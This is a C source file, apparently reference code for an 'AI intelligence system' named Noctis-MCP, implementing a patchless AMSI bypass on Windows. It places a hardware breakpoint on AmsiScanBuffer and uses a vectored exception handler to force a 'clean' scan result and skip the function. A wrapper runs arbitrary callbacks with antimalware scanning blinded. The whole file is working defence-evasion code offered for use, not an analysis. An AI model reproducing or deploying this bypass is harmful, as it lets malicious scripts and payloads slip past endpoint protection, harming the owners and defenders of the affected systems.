// Reference code for Noctis-MCP AI intelligence system
// VEH² (Vectored Exception Handler²) - Patchless AMSI Bypass Implementation

#include "veh2_bypass.h"
#include <stdio.h>

// Global context for VEH handler
static PVEH2_CONTEXT g_pVEH2Context = NULL;

// Vectored Exception Handler - intercepts hardware breakpoint exceptions
LONG WINAPI VEH2_ExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo) {
    if (!g_pVEH2Context || !g_pVEH2Context->bBypassActive) {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // Check if this is our hardware breakpoint exception
    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        PCONTEXT pContext = pExceptionInfo->ContextRecord;

        // Verify this is AmsiScanBuffer breakpoint
        #ifdef _WIN64
        if ((PVOID)pContext->Rip == g_pVEH2Context->pAmsiScanBufferAddr) {
            // Modify RAX to return AMSI_RESULT_CLEAN
            pContext->Rax = AMSI_RESULT_CLEAN;

            // Clear trap flag to prevent infinite loop
            pContext->EFlags &= ~0x100;

            // Skip the actual AmsiScanBuffer execution
            // IMPORTANT: Don't just increment by 1 - that jumps into middle of instruction stream
            // Instead, set RIP to the return address on the stack (caller's address)
            // This makes the function return immediately without executing
            PVOID* pStackPointer = (PVOID*)pContext->Rsp;
            pContext->Rip = (DWORD64)(*pStackPointer); // Set RIP to return address
            pContext->Rsp += sizeof(PVOID); // Adjust stack pointer (pop return address)

            return EXCEPTION_CONTINUE_EXECUTION;
        }
        #else
        if ((PVOID)pContext->Eip == g_pVEH2Context->pAmsiScanBufferAddr) {
            // x86 version
            pContext->Eax = AMSI_RESULT_CLEAN;
            pContext->EFlags &= ~0x100;

            // Set EIP to return address (same logic as x64)
            PVOID* pStackPointer = (PVOID*)pContext->Esp;
            pContext->Eip = (DWORD)(*pStackPointer);
            pContext->Esp += sizeof(PVOID);

            return EXCEPTION_CONTINUE_EXECUTION;
        }
        #endif
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

// Get AmsiScanBuffer address from amsi.dll
PVOID VEH2_GetAmsiScanBufferAddress(VOID) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        return NULL;
    }

    PVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        FreeLibrary(hAmsi);
        return NULL;
    }

    // Don't free the library - we need it loaded
    return pAmsiScanBuffer;
}

// Set hardware breakpoint using debug registers
BOOL VEH2_SetHardwareBreakpoint(
    HANDLE hThread,
    PVOID pAddress,
    DWORD dwRegisterIndex,
    DWORD dwCondition,
    DWORD dwSize
) {
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!GetThreadContext(hThread, &ctx)) {
        return FALSE;
    }

    // Set debug register based on index
    switch (dwRegisterIndex) {
        case DR0_INDEX: ctx.Dr0 = (DWORD64)pAddress; break;
        case DR1_INDEX: ctx.Dr1 = (DWORD64)pAddress; break;
        case DR2_INDEX: ctx.Dr2 = (DWORD64)pAddress; break;
        case DR3_INDEX: ctx.Dr3 = (DWORD64)pAddress; break;
        default: return FALSE;
    }

    // Set DR7 flags for breakpoint
    // DR7 format: [LEN3][RW3][LEN2][RW2][LEN1][RW1][LEN0][RW0][reserved][GE][LE][G3][L3][G2][L2][G1][L1][G0][L0]
    DWORD64 dr7Flags = (dwCondition << (16 + dwRegisterIndex * 4)) |
                       (dwSize << (18 + dwRegisterIndex * 4)) |
                       (1 << (dwRegisterIndex * 2)); // Local enable bit

    ctx.Dr7 |= dr7Flags;

    if (!SetThreadContext(hThread, &ctx)) {
        return FALSE;
    }

    return TRUE;
}

// Clear hardware breakpoint
BOOL VEH2_ClearHardwareBreakpoint(HANDLE hThread, DWORD dwRegisterIndex) {
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!GetThreadContext(hThread, &ctx)) {
        return FALSE;
    }

    // Clear debug register
    switch (dwRegisterIndex) {
        case DR0_INDEX: ctx.Dr0 = 0; break;
        case DR1_INDEX: ctx.Dr1 = 0; break;
        case DR2_INDEX: ctx.Dr2 = 0; break;
        case DR3_INDEX: ctx.Dr3 = 0; break;
        default: return FALSE;
    }

    // Clear DR7 flags for this breakpoint
    DWORD64 dr7Mask = ~(0xF << (16 + dwRegisterIndex * 4) | // Clear RW and LEN bits
                        (0x3 << (dwRegisterIndex * 2)));     // Clear enable bits
    ctx.Dr7 &= dr7Mask;

    if (!SetThreadContext(hThread, &ctx)) {
        return FALSE;
    }

    return TRUE;
}

// Initialize VEH² AMSI bypass system
BOOL VEH2_Initialize(PVEH2_CONTEXT pContext) {
    if (!pContext) return FALSE;

    ZeroMemory(pContext, sizeof(VEH2_CONTEXT));

    // Get AmsiScanBuffer address
    pContext->pAmsiScanBufferAddr = VEH2_GetAmsiScanBufferAddress();
    if (!pContext->pAmsiScanBufferAddr) {
        return FALSE;
    }

    // Register Vectored Exception Handler (first in chain for priority)
    g_pVEH2Context = pContext; // Set global context for handler
    pContext->pVectoredHandler = AddVectoredExceptionHandler(1, VEH2_ExceptionHandler);
    if (!pContext->pVectoredHandler) {
        g_pVEH2Context = NULL;
        return FALSE;
    }

    pContext->dwThreadId = GetCurrentThreadId();
    pContext->bBypassActive = FALSE;

    return TRUE;
}

// Enable hardware breakpoint on AmsiScanBuffer
BOOL VEH2_EnableBreakpoint(PVEH2_CONTEXT pContext) {
    if (!pContext || !pContext->pAmsiScanBufferAddr) return FALSE;

    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pContext->dwThreadId);
    if (!hThread) {
        return FALSE;
    }

    // Set execution breakpoint on AmsiScanBuffer using DR0
    BOOL bResult = VEH2_SetHardwareBreakpoint(
        hThread,
        pContext->pAmsiScanBufferAddr,
        DR0_INDEX,
        BREAK_ON_EXECUTION,
        BREAK_SIZE_1_BYTE
    );

    CloseHandle(hThread);

    if (bResult) {
        pContext->bBypassActive = TRUE;
    }

    return bResult;
}

// Disable hardware breakpoint
BOOL VEH2_DisableBreakpoint(PVEH2_CONTEXT pContext) {
    if (!pContext) return FALSE;

    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pContext->dwThreadId);
    if (!hThread) {
        return FALSE;
    }

    BOOL bResult = VEH2_ClearHardwareBreakpoint(hThread, DR0_INDEX);
    CloseHandle(hThread);

    if (bResult) {
        pContext->bBypassActive = FALSE;
    }

    return bResult;
}

// Cleanup VEH² bypass
VOID VEH2_Cleanup(PVEH2_CONTEXT pContext) {
    if (!pContext) return;

    // Disable breakpoint
    if (pContext->bBypassActive) {
        VEH2_DisableBreakpoint(pContext);
    }

    // Remove VEH handler
    if (pContext->pVectoredHandler) {
        RemoveVectoredExceptionHandler(pContext->pVectoredHandler);
        pContext->pVectoredHandler = NULL;
    }

    // Clear global context
    if (g_pVEH2Context == pContext) {
        g_pVEH2Context = NULL;
    }

    // Secure cleanup
    SecureZeroMemory(pContext, sizeof(VEH2_CONTEXT));
}

// Example usage function
BOOL VEH2_ExecuteWithAMSIBypass(VOID (*pCallback)(VOID)) {
    VEH2_CONTEXT vehContext = { 0 };

    // Initialize VEH² system
    if (!VEH2_Initialize(&vehContext)) {
        return FALSE;
    }

    // Enable hardware breakpoint
    if (!VEH2_EnableBreakpoint(&vehContext)) {
        VEH2_Cleanup(&vehContext);
        return FALSE;
    }

    // Execute callback with AMSI bypassed
    // Note: VEH handler will catch any exceptions during execution
    if (pCallback) {
        pCallback();
    }

    // Cleanup
    VEH2_Cleanup(&vehContext);

    return TRUE;
}
